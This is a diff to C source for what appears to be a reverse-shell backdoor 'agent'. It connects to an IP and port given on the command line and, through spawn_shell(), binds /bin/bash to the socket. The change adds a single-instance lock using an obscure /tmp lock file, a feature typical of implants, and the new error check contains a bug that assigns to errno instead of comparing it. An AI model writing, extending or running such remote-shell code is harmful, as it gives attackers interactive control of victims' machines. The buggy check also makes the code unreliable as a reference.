@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <string.h>
 #include <fcntl.h>
+#include <errno.h>
 
 void spawn_shell(int socket) {
   dup2(socket,0);
@@ -15,6 +16,26 @@ void spawn_shell(int socket) {
 
   char * const argv[] = {"/bin/bash",NULL};
   execvp("/bin/bash",argv);
+}
+
+void no_duplicates() {
+  const char *lock_file="/tmp/C9k0Xq.lock";
+  int fd=open(lock_file,O_RDWR|O_CREAT,0644);
+  if(fd<0) {
+    perror("[Error] Failed to create lock file");
+    exit(-1);
+  }
+  if(lockf(fd,F_TLOCK,0)<0) {
+    if(errno=EACCES || errno==EAGAIN) {
+      perror("[Error] Another instance is already running");
+      close(fd);
+      exit(-1);
+    }
+  }
+  char pid[10];
+  snprintf(pid,sizeof(pid),"%d\n",getpid());
+  write(fd,pid,strlen(pid));
+  return;
 }
 
 void log_error(int socket, const char *error_msg){
@@ -91,6 +112,7 @@ int main(int argc, char *argv[]) {
     printf("./agent <ip> <port>\n");
     return 0;
   }
+  no_duplicates();
   int sockd;
   char *ip=argv[1];
   int port =atoi(argv[2]);  
